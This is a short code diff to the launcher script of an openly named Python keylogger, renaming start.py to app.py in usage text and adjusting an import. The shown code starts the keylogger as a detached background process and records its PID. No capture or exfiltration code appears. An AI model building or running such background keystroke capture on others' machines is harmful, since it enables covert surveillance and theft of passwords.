@@ -1,11 +1,11 @@
 import subprocess, sys, os, signal, art
 from rich import print
-from KeyLogger import *
+from keylogger import KeyLogger
 
 def print_info(err):
     if(err):
         print("\n[bold red]ERROR:[/bold red] "+ err)
-    print("[bold]USAGE:[/bold] python start.py [italic]OPTIONS[/italic]")
+    print("[bold]USAGE:[/bold] python app.py [italic]OPTIONS[/italic]")
     print("\t-s Open visible process of KeyLogger")
     print("\t-b Open background process of KeyLogger")
 
@@ -26,7 +26,7 @@ if __name__ == "__main__":
             f = open("logs.txt", "w+")
             pid = subprocess.Popen(["python","KeyLogger.py"], stdout=f, creationflags=subprocess.DETACHED_PROCESS).pid
             print("\n[bold green]KEYLOGGER STARTED[/bold green]")
-            print("PROCESS PID was saved in logs.txt - Use python start.py -k [bold white]" + str(pid) + "[/bold white] to terminate process")
+            print("PROCESS PID was saved in logs.txt - Use python app.py -k [bold white]" + str(pid) + "[/bold white] to terminate process")
             print("[italic magenta](You can close this console)[/italic magenta]")
             f.write(str(pid))
             exit(0)
